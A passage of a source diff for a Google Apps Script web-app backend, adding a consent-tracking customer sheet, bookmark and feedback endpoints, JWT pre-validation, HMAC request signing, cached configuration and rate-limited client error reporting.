- * requests, queued nose-to-tail. Here the token is verified ONCE.
+ * load: their upvoted video ids, starred channels AND bookmarked items.
+ * Replaces the separate per-feature POSTs fired back-to-back at sign-in —
+ * each re-verified the ID token over the network and, because Apps Script
+ * serializes a user's requests, queued nose-to-tail. Here the token is
+ * verified ONCE. `video_ids` carries the votes, `bookmark_ids` the bookmarks.
  */
 function handleBootstrap(data) {
   var token = data.token;
@@ -3185,7 +4833,511 @@ function handleBootstrap(data) {
     status: 'ok',
     video_ids: readUserVoteIds(user.email),
     channels: readUserStarChannels(user.email),
+    bookmark_ids: readUserBookmarkIds(user.email),
+    // 'yes' | 'no' | null (never answered). The read also lists the account
+    // in the CUSTOMERS sheet on first sighting — every signed-in email is
+    // recorded there, consent answered or not.
+    marketing_consent: readOrCreateCustomer(user.email, user.name),
   };
+}
+
+// ============================================================
+// CUSTOMERS — the single user-data spreadsheet
+// ============================================================
+//
+// SPREADSHEET_IDS.CUSTOMERS holds everything keyed to a signed-in account:
+// the Customers tab (identity + marketing consent) plus the Votes, Stars,
+// Bookmarks and Feedback tabs (getUserDataTab above). One place to export
+// or delete a user's data — their comments, which are public content, are
+// the only per-user rows elsewhere. NOTE: because the activity tabs live
+// here, sharing this spreadsheet shares activity too — hand off a mailing
+// list by exporting the Customers tab, not by sharing the file.
+//
+// Customers rows: one per Google account, created the first time the
+// account signs in (bootstrap); marketing_consent stays blank until the
+// person answers the overlay prompt — blank is "never asked/answered",
+// never "no". The timestamped consent_updated_at cell is the compliance
+// record: only rows with marketing_consent = 'yes' may ever be emailed.
+
+var CUSTOMER_HEADERS = ['email', 'name', 'marketing_consent', 'consent_updated_at', 'first_seen_at', 'source'];
+
+// Operator-typed header variants the normalizer rewrites to canonical names,
+// keyed by the lowercased, underscore-joined cell text.
+var CUSTOMER_HEADER_ALIASES = {
+  'e-mail': 'email', 'mail': 'email', 'email_address': 'email', 'user_email': 'email',
+  'full_name': 'name', 'user_name': 'name', 'username': 'name', 'customer': 'name', 'customer_name': 'name',
+  'consent': 'marketing_consent', 'marketing': 'marketing_consent', 'marketing_emails': 'marketing_consent',
+  'newsletter': 'marketing_consent', 'subscribed': 'marketing_consent', 'emails': 'marketing_consent',
+  'consent_date': 'consent_updated_at', 'consent_at': 'consent_updated_at', 'updated_at': 'consent_updated_at',
+  'created_at': 'first_seen_at', 'signup_date': 'first_seen_at', 'signed_up_at': 'first_seen_at', 'date': 'first_seen_at',
+};
+
+/**
+ * The "Customers" tab of the CUSTOMERS spreadsheet, with its header row
+ * normalized to CUSTOMER_HEADERS on every access (idempotent — writes only
+ * when something differs). An empty sheet, or one holding only a header row,
+ * gets the canonical row outright; once data rows exist, recognized alias
+ * titles are renamed in place and missing canonical columns are appended on
+ * the right — existing data is never reordered.
+ *
+ * Looked up BY NAME, not by position: the spreadsheet also carries the
+ * Votes/Stars/Bookmarks tabs, so "first tab" stopped being a safe address
+ * the moment a tab could be dragged. The pre-consolidation spreadsheet held
+ * a single unnamed tab (e.g. "Sheet1") — the first access claims the first
+ * non-activity tab by renaming it, so existing rows keep working; a
+ * brand-new spreadsheet gets a fresh tab.
+ * @returns {Sheet}
+ */
+function getCustomersSheet() {
+  var ss = getCustomersSpreadsheet();
+  var sheet = ss.getSheetByName('Customers');
+  if (!sheet) {
+    var tabs = ss.getSheets();
+    for (var i = 0; i < tabs.length; i++) {
+      var n = tabs[i].getName();
+      if (n !== 'Votes' && n !== 'Stars' && n !== 'Bookmarks' && n !== FEEDBACK_SHEET_NAME) { sheet = tabs[i]; break; }
+    }
+    if (sheet) sheet.setName('Customers');
+    else sheet = ss.insertSheet('Customers');
+  }
+  ensureCustomerHeaders(sheet);
+  return sheet;
+}
+
+function ensureCustomerHeaders(sheet) {
+  var lastRow = sheet.getLastRow();
+  var lastCol = sheet.getLastColumn();
+
+  // Nothing but (at most) a title row: make row 1 exactly canonical.
+  if (lastRow <= 1) {
+    var same = false;
+    if (lastCol >= CUSTOMER_HEADERS.length) {
+      var current = sheet.getRange(1, 1, 1, CUSTOMER_HEADERS.length).getValues()[0];
+      same = lastCol === CUSTOMER_HEADERS.length &&
+        current.join('|') === CUSTOMER_HEADERS.join('|');
+    }
+    if (!same) {
+      if (lastRow === 1 && lastCol > 0) sheet.getRange(1, 1, 1, lastCol).clearContent();
+      var hr = sheet.getRange(1, 1, 1, CUSTOMER_HEADERS.length);
+      hr.setNumberFormat('@');
+      hr.setValues([CUSTOMER_HEADERS]);
+    }
+    return;
+  }
+
+  // Data rows exist: rename recognized aliases in place, append what's missing.
+  var row1 = sheet.getRange(1, 1, 1, lastCol).getValues()[0];
+  var canon = row1.map(function (h) {
+    var norm = String(h || '').trim().toLowerCase().replace(/\s+/g, '_');
+    return CUSTOMER_HEADER_ALIASES[norm] || norm;
+  });
+  for (var c = 0; c < canon.length; c++) {
+    if (CUSTOMER_HEADERS.indexOf(canon[c]) !== -1 && row1[c] !== canon[c]) {
+      sheet.getRange(1, c + 1).setValue(canon[c]);
+    }
+  }
+  var have = {};
+  for (var i = 0; i < canon.length; i++) have[canon[i]] = true;
+  var appendAt = lastCol;
+  for (var k = 0; k < CUSTOMER_HEADERS.length; k++) {
+    if (!have[CUSTOMER_HEADERS[k]]) {
+      appendAt++;
+      sheet.getRange(1, appendAt).setValue(CUSTOMER_HEADERS[k]);
+    }
+  }
+}
+
+/** Column index per canonical header for the sheet's CURRENT row 1. */
+function customerCols(sheet) {
+  var headers = sheet.getRange(1, 1, 1, sheet.getLastColumn()).getValues()[0];
+  var cols = {};
+  for (var i = 0; i < CUSTOMER_HEADERS.length; i++) {
+    cols[CUSTOMER_HEADERS[i]] = headers.indexOf(CUSTOMER_HEADERS[i]);
+  }
+  cols._width = headers.length;
+  return cols;
+}
+
+/** Normalizes a stored consent cell to 'yes' | 'no' | null (blank/unknown). */
+function normalizeConsent(value) {
+  var v = String(value == null ? '' : value).trim().toLowerCase();
+  return v === 'yes' || v === 'no' ? v : null;
+}
+
+/** Appends one customer row shaped to the sheet's current columns ('@' text). */
+function appendCustomerRow(sheet, cols, fields) {
+  var row = [];
+  for (var i = 0; i < cols._width; i++) row.push('');
+  if (cols.email !== -1) row[cols.email] = fields.email;
+  if (cols.name !== -1) row[cols.name] = fields.name || '';
+  if (cols.marketing_consent !== -1) row[cols.marketing_consent] = fields.consent || '';
+  if (cols.consent_updated_at !== -1) row[cols.consent_updated_at] = fields.consentAt || '';
+  if (cols.first_seen_at !== -1) row[cols.first_seen_at] = fields.firstSeenAt || '';
+  if (cols.source !== -1) row[cols.source] = fields.source || '';
+  var range = sheet.getRange(sheet.getLastRow() + 1, 1, 1, cols._width);
+  range.setNumberFormat('@');
+  range.setValues([row]);
+}
+
+/**
+ * The account's current consent ('yes' | 'no' | null), creating its
+ * CUSTOMERS row on first sighting so every signed-in email is listed.
+ * The insert (and only the insert) runs under the script lock so two
+ * parallel bootstraps can't double-list an account; on lock contention
+ * the row simply lands on the next load.
+ */
+function readOrCreateCustomer(email, name) {
+  var sheet;
+  var cols;
+  try {
+    sheet = getCustomersSheet();
+    cols = customerCols(sheet);
+  } catch (e) {
+    // The customers spreadsheet being unreachable (not shared with the script
+    // owner yet, deleted, …) must never break sign-in reconciliation — the
+    // bootstrap still owes the caller votes/stars/bookmarks. Returning
+    // undefined drops the marketing_consent key from the JSON payload, which
+    // the frontend reads as "consent unsupported" and never prompts.
+    log('ERROR', 'customers', 'CUSTOMERS sheet unavailable: ' + e.message);
+    return undefined;
+  }
+  if (cols.email === -1) return null; // headers unfixable (shouldn't happen)
+
+  var rows = sheet.getDataRange().getValues();
+  for (var i = 1; i < rows.length; i++) {
+    if (rows[i][cols.email] === email) {
+      // Bootstrap has the row in hand: cache first_seen now so the user's
+      // votes resolve tenure from cache instead of rescanning CUSTOMERS.
+      rememberFirstSeen(email, rows[i][cols.first_seen_at]);
+      return normalizeConsent(rows[i][cols.marketing_consent]);
+    }
+  }
+
+  var lock = LockService.getScriptLock();
+  try {
+    lock.waitLock(10000);
+  } catch (e) {
+    return null; // busy — the account gets listed on its next load
+  }
+  try {
+    // Re-check under the lock: a parallel bootstrap may have inserted it.
+    var again = sheet.getDataRange().getValues();
+    for (var j = 1; j < again.length; j++) {
+      if (again[j][cols.email] === email) {
+        rememberFirstSeen(email, again[j][cols.first_seen_at]);
+        return normalizeConsent(again[j][cols.marketing_consent]);
+      }
+    }
+    var firstSeenIso = new Date().toISOString();
+    appendCustomerRow(sheet, cols, {
+      email: email,
+      name: name,
+      firstSeenAt: firstSeenIso,
+      source: 'google_signin',
+    });
+    rememberFirstSeen(email, firstSeenIso);
+    return null;
+  } finally {
+    lock.releaseLock();
+  }
+}
+
+/**
+ * Records the signed-in user's marketing-email choice from the overlay
+ * prompt (or a later change from Email preferences). `consent` must be a
+ * literal boolean — an explicit yes or an explicit no; there is no way to
+ * blank a consent back out through the API, so the timestamped record
+ * always reflects a deliberate answer.
+ */
+function handleEmailConsent(data) {
+  var token = data.token;
+  if (typeof data.consent !== 'boolean') {
+    return { status: 'error', message: 'consent must be true or false' };
+  }
+  if (!token) {
+    return { status: 'error', message: 'token is required' };
+  }
+
+  var user = authenticateUser(token);
+  if (!user) {
+    log('ERROR', 'emailConsent', 'Invalid Google token');
+    return { status: 'error', message: 'Invalid authentication token' };
+  }
+
+  if (isUserBlocked(user.email)) {
+    return { status: 'error', message: 'You have been blocked' };
+  }
+
+  // Same pre-lock throttle as the other per-user toggles.
+  if (isActionRateLimited('consent', user.email, VOTE_STAR_RATE_LIMIT_SECONDS)) {
+    return { status: 'error', message: 'You are doing that too fast, please slow down' };
+  }
+
+  var consent = data.consent ? 'yes' : 'no';
+  var now = new Date().toISOString();
+
+  var lock = LockService.getScriptLock();
+  try {
+    lock.waitLock(10000);
+  } catch (e) {
+    return { status: 'error', message: 'Server busy, please retry' };
+  }
+
+  try {
+    var sheet = getCustomersSheet();
+    var cols = customerCols(sheet);
+    if (cols.email === -1 || cols.marketing_consent === -1) {
+      return { status: 'error', message: 'Customers sheet is misconfigured' };
+    }
+
+    var rows = sheet.getDataRange().getValues();
+    var rowNum = -1;
+    for (var i = 1; i < rows.length; i++) {
+      if (rows[i][cols.email] === user.email) {
+        rowNum = i + 1; // 1-based sheet row
+        break;
+      }
+    }
+
+    if (rowNum !== -1) {
+      var set = function (col, value) {
+        if (col === -1) return;
+        var cell = sheet.getRange(rowNum, col + 1);
+        cell.setNumberFormat('@');
+        cell.setValue(value);
+      };
+      set(cols.marketing_consent, consent);
+      set(cols.consent_updated_at, now);
+      if (user.name) set(cols.name, user.name);
+    } else {
+      appendCustomerRow(sheet, cols, {
+        email: user.email,
+        name: user.name,
+        consent: consent,
+        consentAt: now,
+        firstSeenAt: now,
+        source: 'consent_prompt',
+      });
+    }
+
+    return { status: 'ok', marketing_consent: consent };
+  } finally {
+    lock.releaseLock();
+  }
+}
+
+// ============================================================
+// BOOKMARKS — saved items, one per Google account per video
+// ============================================================
+
+/**
+ * Gets (or creates) the "Bookmarks" tab of the CUSTOMERS spreadsheet.
+ * @returns {Sheet}
+ */
+function getBookmarksSheet() {
+  return getUserDataTab('Bookmarks', ['bookmark_id', 'video_id', 'user_email', 'created_at']);
+}
+
+/**
+ * Toggles a user's bookmark on an item (video or article).
+ * If the user has already bookmarked the item, the bookmark is removed.
+ * Mirrors handleVote minus the count bookkeeping — bookmarks are private,
+ * so no aggregate is stored on the video row.
+ */
+function handleBookmark(data) {
+  var videoId = data.videoId;
+  var token = data.token;
+
+  if (!videoId || !token) {
+    return { status: 'error', message: 'videoId and token are required' };
+  }
+
+  if (!isValidId(videoId)) {
+    return { status: 'error', message: 'Invalid videoId' };
+  }
+
+  var user = authenticateUser(token);
+  if (!user) {
+    log('ERROR', 'bookmark', 'Invalid Google token');
+    return { status: 'error', message: 'Invalid authentication token' };
+  }
+
+  if (isUserBlocked(user.email)) {
+    return { status: 'error', message: 'You have been blocked' };
+  }
+
+  // Same pre-lock throttle as handleVote/handleStar: cheap but lockful.
+  if (isActionRateLimited('bookmark', user.email, VOTE_STAR_RATE_LIMIT_SECONDS)) {
+    return { status: 'error', message: 'You are doing that too fast, please slow down' };
+  }
+
+  // Serialize read-find-mutate so concurrent toggles can't double-insert
+  // or delete a row that shifted under a stale index.
+  var lock = LockService.getScriptLock();
+  try {
+    lock.waitLock(10000);
+  } catch (e) {
+    return { status: 'error', message: 'Server busy, please retry' };
+  }
+
+  try {
+    var sheet = getBookmarksSheet();
+    var rows = sheet.getDataRange().getValues();
+    var headers = rows[0];
+    var videoIdCol = headers.indexOf('video_id');
+    var emailCol = headers.indexOf('user_email');
+
+    // Find this user's existing bookmark on this item.
+    var existingRow = -1;
+    for (var i = 1; i < rows.length; i++) {
+      if (rows[i][videoIdCol] === videoId && rows[i][emailCol] === user.email) {
+        existingRow = i + 1; // 1-based sheet row
+        break;
+      }
+    }
+
+    var bookmarked;
+    if (existingRow !== -1) {
+      sheet.deleteRow(existingRow);
+      bookmarked = false;
+    } else {
+      // Write as plain text so Sheets can't coerce videoId/email into a live
+      // formula — same reserve-then-format pair as handleVote/handleStar.
+      var bookmarkId = 'b_' + Utilities.getUuid().replace(/-/g, '').substring(0, 12);
+      var newRowNum = sheet.getLastRow() + 1;
+      var range = sheet.getRange(newRowNum, 1, 1, 4);
+      range.setNumberFormat('@');
+      range.setValues([[bookmarkId, videoId, user.email, new Date().toISOString()]]);
+      bookmarked = true;
+    }
+
+    return { status: 'ok', bookmarked: bookmarked };
+  } finally {
+    lock.releaseLock();
+  }
+}
+
+/**
+ * Returns the video ids the signed-in user has bookmarked, so the client can
+ * mark bookmark buttons and build the Bookmarks feed. Keyed `bookmark_ids`
+ * (not `video_ids`) so the payload shape matches the bootstrap batch, where
+ * `video_ids` already carries the user's votes.
+ */
+function handleMyBookmarks(data) {
+  var token = data.token;
+  if (!token) {
+    return { status: 'error', message: 'token is required' };
+  }
+
+  var user = authenticateUser(token);
+  if (!user) {
+    return { status: 'error', message: 'Invalid authentication token' };
+  }
+
+  return { status: 'ok', bookmark_ids: readUserBookmarkIds(user.email) };
+}
+
+/** Video ids the given user has bookmarked. Shared by myBookmarks and bootstrap. */
+function readUserBookmarkIds(email) {
+  var sheet = getBookmarksSheet();
+  var rows = sheet.getDataRange().getValues();
+  var headers = rows[0];
+  var videoIdCol = headers.indexOf('video_id');
+  var emailCol = headers.indexOf('user_email');
+
+  var ids = [];
+  for (var i = 1; i < rows.length; i++) {
+    if (rows[i][emailCol] === email) ids.push(String(rows[i][videoIdCol]));
+  }
+  return ids;
+}
+
+// ============================================================
+// FEEDBACK — the floating "Send feedback" button's submissions
+// ============================================================
+//
+// Rows land in the "Feedback" tab of the CUSTOMERS spreadsheet (the one
+// user-data file — a person's feedback is part of their data, so it lives
+// next to their account row and activity tabs). Signed-in only: every send
+// must carry a valid token, and the row is stamped with the sender's
+// verified email + name. Guards: a message length cap and the same per-user
+// spacing as comments.
+
+var FEEDBACK_SHEET_NAME = 'Feedback';
+var FEEDBACK_HEADERS = [
+  'feedback_id', 'created_at', 'email', 'name', 'message',
+  'page', 'app_version', 'user_agent',
+];
+const FEEDBACK_MAX_LENGTH = 2000;        // chars; the dialog's textarea caps at the same
+const FEEDBACK_RATE_LIMIT_SECONDS = 30;  // per sender (same as comments)
+const FEEDBACK_FIELD_LIMITS = { page: 300, appVersion: 20, userAgent: 300 };
+
+/**
+ * Gets (or creates) the "Feedback" tab of the CUSTOMERS spreadsheet.
+ * @returns {Sheet}
+ */
+function getFeedbackSheet() {
+  return getUserDataTab(FEEDBACK_SHEET_NAME, FEEDBACK_HEADERS);
+}
+
+/**
+ * Records one feedback message from a signed-in user. `message` is required
+ * (non-blank, at most FEEDBACK_MAX_LENGTH chars — over-long is REJECTED, not
+ * clipped, so the sender knows it didn't land whole); `token` is required
+ * and must verify — the row carries the sender's email + name.
+ */
+function handleFeedback(data) {
+  var message = typeof data.message === 'string' ? data.message.trim() : '';
+  if (!message || !data.token) {
+    return { status: 'error', message: 'message and token are required' };
+  }
+  if (message.length > FEEDBACK_MAX_LENGTH) {
+    return { status: 'error', message: 'Feedback is too long (max ' + FEEDBACK_MAX_LENGTH + ' characters)' };
+  }
+
+  var user = authenticateUser(data.token);
+  if (!user) {
+    log('ERROR', 'feedback', 'Invalid Google token');
+    return { status: 'error', message: 'Invalid authentication token' };
+  }
+  if (isUserBlocked(user.email)) {
+    return { status: 'error', message: 'You have been blocked' };
+  }
+  if (isActionRateLimited('feedback', user.email, FEEDBACK_RATE_LIMIT_SECONDS)) {
+    return { status: 'error', message: 'You are doing that too fast, please slow down' };
+  }
+
+  var row = [
+    Utilities.getUuid(),
+    new Date().toISOString(),
+    user.email,
+    user.name || '',
+    message,
+    clip(data.page, FEEDBACK_FIELD_LIMITS.page),
+    clip(data.appVersion, FEEDBACK_FIELD_LIMITS.appVersion),
+    clip(data.userAgent, FEEDBACK_FIELD_LIMITS.userAgent),
+  ];
+
+  var lock = LockService.getScriptLock();
+  try {
+    lock.waitLock(10000);
+  } catch (e) {
+    return { status: 'error', message: 'Server busy, please retry' };
+  }
+
+  try {
+    var sheet = getFeedbackSheet();
+    // '@' (plain text) before the values land: a message starting with
+    // = + - @ must never execute as a formula when the owner opens the
+    // sheet. Mirrors the Comments and clientError writers.
+    var range = sheet.getRange(sheet.getLastRow() + 1, 1, 1, FEEDBACK_HEADERS.length);
+    range.setNumberFormat('@');
+    range.setValues([row]);
+  } finally {
+    lock.releaseLock();
+  }
+
+  return { status: 'ok', feedback_id: row[0] };
 }
 
 // ============================================================
@@ -3208,9 +5360,12 @@ function verifyGoogleToken(idToken) {
   // to a live verification.
   var cache = null;
   var cacheKey = null;
+  var negKey = null;
   try {
     cache = CacheService.getScriptCache();
-    cacheKey = 'tok_' + tokenHash(idToken);
+    var th = tokenHash(idToken);
+    cacheKey = 'tok_' + th;
+    negKey = 'tokneg_' + th;
     var cached = cache.get(cacheKey);
     if (cached) {
       var claims = JSON.parse(cached);
@@ -3219,8 +5374,40 @@ function verifyGoogleToken(idToken) {
         return { email: claims.email, name: claims.name, picture: claims.picture };
       }
     }
+    // Negative cache: a token that already failed LOCAL pre-validation is refused
+    // here with no decode and no fetch, so a flood of the same bad token can't
+    // burn the ~20k/day UrlFetch cap (SEC1/BE4).
+    if (cache.get(negKey)) {
+      return null;
+    }
   } catch (e) {
     cache = null;
+  }
+
+  // Offline pre-flight: decode the JWT payload WITHOUT a network call and reject
+  // anything that can't possibly verify — wrong audience, wrong issuer, or already
+  // expired — before spending a UrlFetchApp quota unit (SEC1/BE4). A token that
+  // isn't a decodable JWT falls through to the live check below (unchanged
+  // behavior); only a well-formed-but-invalid JWT is rejected + negatively cached
+  // here. The live tokeninfo call is still required to verify the SIGNATURE, so a
+  // token that passes this pre-flight is NOT trusted yet.
+  var pre = null;
+  try {
+    pre = decodeJwtPayload(idToken);
+  } catch (e) {
+    pre = null;
+  }
+  if (pre) {
+    var audOk = pre.aud === GOOGLE_CLIENT_ID;
+    var issOk = pre.iss === 'accounts.google.com' || pre.iss === 'https://accounts.google.com';
+    var expOk = pre.exp && parseInt(pre.exp, 10) * 1000 > Date.now();
+    if (!audOk || !issOk || !expOk) {
+      log('ERROR', 'verifyGoogleToken', 'Token failed local pre-validation (no fetch)');
+      if (cache && negKey) {
+        try { cache.put(negKey, '1', TOKEN_NEG_CACHE_SECONDS); } catch (e) { /* best-effort */ }
+      }
+      return null;
+    }
   }
 
   try {
@@ -3290,6 +5477,30 @@ function verifyGoogleToken(idToken) {
 function tokenHash(idToken) {
   var bytes = Utilities.computeDigest(Utilities.DigestAlgorithm.SHA_256, idToken);
   return Utilities.base64EncodeWebSafe(bytes);
+}
+
+/**
+ * Decodes the CLAIMS (middle segment) of a JWT locally, WITHOUT verifying the
+ * signature. Used only for the pre-flight audience/issuer/expiry gate in
+ * verifyGoogleToken — a cheap filter that lets an obviously-invalid token be
+ * rejected before the tokeninfo round trip. Returns the parsed payload object, or
+ * null when the input isn't a well-formed 3-segment JWT (the caller then falls
+ * through to the live verification). NEVER treat a truthy return as "verified" —
+ * the payload is attacker-controlled until tokeninfo confirms the signature.
+ * @param {string} idToken
+ * @returns {Object|null}
+ */
+function decodeJwtPayload(idToken) {
+  var parts = String(idToken).split('.');
+  if (parts.length !== 3) return null;
+  var seg = parts[1];
+  // JWT uses base64url with the padding stripped; restore it for the decoder.
+  var mod = seg.length % 4;
+  if (mod === 1) return null; // impossible length for valid base64
+  if (mod === 2) seg += '==';
+  else if (mod === 3) seg += '=';
+  var json = Utilities.newBlob(Utilities.base64DecodeWebSafe(seg)).getDataAsString();
+  return JSON.parse(json);
 }
 
 // ============================================================
@@ -3388,6 +5599,80 @@ function verifySessionToken(token) {
     log('ERROR', 'verifySessionToken', error.message);
     return null;
   }
+}
+
+/**
+ * The canonical string a request signature covers: the action and the client
+ * timestamp, newline-joined. Binds a signature to one action and one moment, so
+ * it can't be lifted onto a different action or replayed past the skew window.
+ * MUST match the frontend's canonicalization in js/api.js.
+ */
+function requestSigningBase(action, ts) {
+  return String(action) + '\n' + String(ts);
+}
+
+/** base64url(HMAC-SHA256(base, REQUEST_SIGNING_SECRET)). */
+function computeRequestSignature(action, ts) {
+  var sig = Utilities.computeHmacSha256Signature(
+    requestSigningBase(action, ts), REQUEST_SIGNING_SECRET);
+  return Utilities.base64EncodeWebSafe(sig);
+}
+
+/**
+ * Verifies the timestamped HMAC on a write POST. Returns true when the body
+ * carries a fresh `ts` (within SIGNATURE_MAX_SKEW_MS of now) and a `sig` that
+ * matches computeRequestSignature for this action. Constant-time signature
+ * compare. Never throws — a malformed ts/sig is just "not valid".
+ *
+ * NOT an authorization check on its own (the secret is public; see the
+ * REQUEST_SIGNING_SECRET note). It only certifies the caller ran our signing
+ * code recently; the Google-token check in each handler still authorizes.
+ *
+ * @param {Object} data - Parsed POST body ({ action, ts, sig, ... })
+ * @returns {boolean}
+ */
+function isRequestSignatureValid(data) {
+  try {
+    if (!data || !data.sig || !data.ts) return false;
+    var ts = parseInt(data.ts, 10);
+    if (!isFinite(ts)) return false;
+    if (Math.abs(Date.now() - ts * 1000) > SIGNATURE_MAX_SKEW_MS) return false;
+    return constantTimeEquals(String(data.sig), computeRequestSignature(data.action, data.ts));
+  } catch (e) {
+    return false;
+  }
+}
+
+/** True while the operator has flipped enforcement on in the Meta sheet. */
+function isSignatureRequired() {
+  return String(getMeta(REQUIRE_SIGNATURE_META_KEY)).toLowerCase() === 'true';
+}
+
+/**
+ * Signature gate for doPost. For a signed action: verifies the request HMAC and,
+ * when enforcement is on (Meta `require_signature` = 'true'), returns an error
+ * response to short-circuit the handler on a missing/invalid/stale signature.
+ * While enforcement is OFF (the rollout default), a failure is only logged and
+ * null is returned so the request proceeds — this is what lets the backend ship
+ * before the signing frontend without breaking older cached clients.
+ *
+ * @param {Object} data - Parsed POST body
+ * @returns {Object|null} An error response to return immediately, or null to proceed.
+ */
+function enforceRequestSignature(data) {
+  var action = data && data.action;
+  if (!action || !SIGNED_ACTIONS[action]) return null; // unsigned action — nothing to check
+  if (isRequestSignatureValid(data)) return null;
+  if (isSignatureRequired()) {
+    log('WARN', 'signature', 'Rejected unsigned/invalid ' + action);
+    return { status: 'error', message: 'Invalid or missing request signature' };
+  }
+  // Soft-launch: record that this client didn't send a valid signature, but let
+  // it through. The count in the logs is the readiness signal for flipping the
+  // Meta toggle on. WARN so it is visible at log_level=WARN (the default ERROR
+  // level drops INFO, which would have hidden this signal entirely).
+  log('WARN', 'signature', 'Unsigned/invalid ' + action + ' (soft — allowed)');
+  return null;
 }
 
 /** Length-then-content comparison with no early-out on the content byte loop. */
@@ -3503,15 +5788,28 @@ function isUserBlocked(email) {
 // META (Key-Value Config)
 // ============================================================
 
-function getMeta(key) {
+// Load the whole Meta sheet into an in-memory {key: value} map, once per
+// execution (memoized in _cachedMeta). Mirrors the _cachedLogLevel /
+// _cachedSessionSecret memo pattern. First occurrence of a key wins, matching
+// the old top-down scan.
+function loadMeta() {
+  if (_cachedMeta !== null) return _cachedMeta;
+
   var sheet = getSheet('META');
   var data = sheet.getDataRange().getValues();
-
+  var map = {};
   for (var i = 1; i < data.length; i++) {
-    if (data[i][0] === key) return data[i][1];
+    var k = data[i][0];
+    if (!(k in map)) map[k] = data[i][1];
   }
 
-  return null;
+  _cachedMeta = map;
+  return _cachedMeta;
+}
+
+function getMeta(key) {
+  var meta = loadMeta();
+  return (key in meta) ? meta[key] : null;
 }
 
 // Read-modify-write with no lock of its own: callers that can race on the
@@ -3526,12 +5824,14 @@ function setMeta(key, value) {
   for (var i = 1; i < data.length; i++) {
     if (data[i][0] === key) {
       sheet.getRange(i + 1, 2).setValue(value);
+      if (_cachedMeta !== null) _cachedMeta[key] = value;
       return;
     }
   }
 
   // Key not found, add new row
   sheet.appendRow([key, value]);
+  if (_cachedMeta !== null) _cachedMeta[key] = value;
 }
 
 // ============================================================
@@ -3547,9 +5847,26 @@ function getLogLevel() {
 }
 
 function log(level, source, message) {
-  var configLevel = getLogLevel();
-  var levelValue = LOG_LEVELS[level] || 0;
-  var configValue = LOG_LEVELS[configLevel] || LOG_LEVELS.ERROR;
+  // getLogLevel() opens the Meta sheet on its first call of the execution. When
+  // the Spreadsheet service itself is what just failed ("Too many simultaneous
+  // invocations: Spreadsheets", 2026-10-03..08), that open throws again — and
+  // log() is what doGet/doPost's catch blocks call, so the second throw
+  // escaped the handler and the execution died as "Failed" with Google's HTML
+  // error page instead of the generic JSON. A logger must never be the reason
+  // a request has no response: fall back to the ERROR-only threshold.
+  var configLevel;
+  try {
+    configLevel = getLogLevel();
+  } catch (e) {
+    configLevel = 'ERROR';
+  }
+  // Presence, not truthiness: LOG_LEVELS.DEBUG is 0, so `||` fallbacks here
+  // would read a configured DEBUG as "unset" and filter at ERROR instead,
+  // silently dropping every DEBUG/INFO line in the one configuration meant
+  // to surface them. An unset or unrecognized level still falls back:
+  // config → ERROR-only, and an unknown `level` argument → most verbose.
+  var levelValue = LOG_LEVELS.hasOwnProperty(level) ? LOG_LEVELS[level] : 0;
+  var configValue = LOG_LEVELS.hasOwnProperty(configLevel) ? LOG_LEVELS[configLevel] : LOG_LEVELS.ERROR;
 
   if (levelValue < configValue) return;
 
@@ -3587,6 +5904,21 @@ function handleLogs(params) {
   return { status: 'ok', logs: logs };
 }
 
+/**
+ * Admin `enrich` action body: runs enrichChannels (the channel-onboarding
+ * backfill) and returns its summary. Auth is enforced by the router (isAdmin,
+ * constant-time) before this is reached — same contract as handleLogs.
+ */
+function handleEnrich() {
+  var summary = enrichChannels();
+  return {
+    status: 'ok',
+    processed: summary.processed,
+    filled: summary.filled,
+    results: summary.results,
+  };
+}
+
 // ============================================================
 // CLIENT ERROR REPORTING
 // ============================================================
@@ -3603,6 +5935,17 @@ const CLIENT_ERRORS_PER_REQUEST = 10;   // rows accepted from one POST
 const CLIENT_ERRORS_PER_MINUTE = 60;    // global budget, approximate (cache
                                       // increments are not atomic; a racing
                                       // burst can slightly overshoot)
+// Per-session slice of the global budget (SEC5). One abusive session used to be
+// able to spend the whole global minute-budget and starve every other user's
+// telemetry; capping each session well below the global keeps one reporter from
+// crowding the rest out. Sessionless reports (no sessionId) only meter globally.
+const CLIENT_ERRORS_PER_SESSION_PER_MINUTE = 20;
+// Meta kill-switch key: set this to a truthy value ('true' / '1' / 'yes') to
+// disable the clientError endpoint entirely (drops everything, still 200). The
+// read is cached briefly so a flood can't hammer the Meta sheet checking it.
+const CLIENT_ERROR_KILL_SWITCH_META_KEY = 'client_error_disabled';
+const CLIENT_ERROR_KILL_SWITCH_CACHE_KEY = 'cerr_killswitch';
+const CLIENT_ERROR_KILL_SWITCH_CACHE_SECONDS = 60;
 const CLIENT_ERROR_FIELD_LIMITS = {
   message: 500,
   stack: 2000,
@@ -3622,6 +5965,27 @@ function clip(value, n) {
   return s.length > n ? s.substring(0, n) : s;
 }
 
+/**
+ * Whether the clientError endpoint is currently disabled via its Meta kill switch
+ * (SEC5). The Meta read is cached for a short window so a flood can't turn every
+ * report into a Meta-sheet scan; the trade is that flipping the switch takes up to
+ * that window to take full effect. Fails OPEN — a check failure leaves telemetry on.
+ * @returns {boolean}
+ */
+function isClientErrorDisabled() {
+  try {
+    var cache = CacheService.getScriptCache();
+    var cached = cache.get(CLIENT_ERROR_KILL_SWITCH_CACHE_KEY);
+    if (cached !== null) return cached === '1';
+    var raw = String(getMeta(CLIENT_ERROR_KILL_SWITCH_META_KEY) || '').trim().toLowerCase();
+    var off = (raw === 'true' || raw === '1' || raw === 'yes' || raw === 'on');
+    cache.put(CLIENT_ERROR_KILL_SWITCH_CACHE_KEY, off ? '1' : '0', CLIENT_ERROR_KILL_SWITCH_CACHE_SECONDS);
+    return off;
+  } catch (e) {
+    return false; // fail open — telemetry stays on if the check itself fails
+  }
+}
+
 function handleClientError(data) {
   var errors = data.errors;
   if (!Array.isArray(errors) || errors.length === 0) {
@@ -3629,28 +5993,46 @@ function handleClientError(data) {
   }
   var batch = errors.slice(0, CLIENT_ERRORS_PER_REQUEST);
 
-  // Global budget check — bucketed by wall-clock minute so the counter
-  // self-expires. Fail-open on cache trouble: losing telemetry beats
-  // erroring, and the sheet write below is the only real cost.
+  // Kill switch: an operator can turn the whole endpoint off from the Meta sheet
+  // (SEC5). Cheap (cached) so it's safe to check on every request.
+  if (isClientErrorDisabled()) {
+    return { status: 'ok', accepted: 0, dropped: batch.length };
+  }
+
+  var sessionId = clip(data.sessionId, 40);
+
+  // Budget check — global AND per-session, both bucketed by wall-clock minute so
+  // the counters self-expire. The per-session cap stops one abusive session from
+  // spending the whole global budget and starving everyone else (SEC5). Fail-open
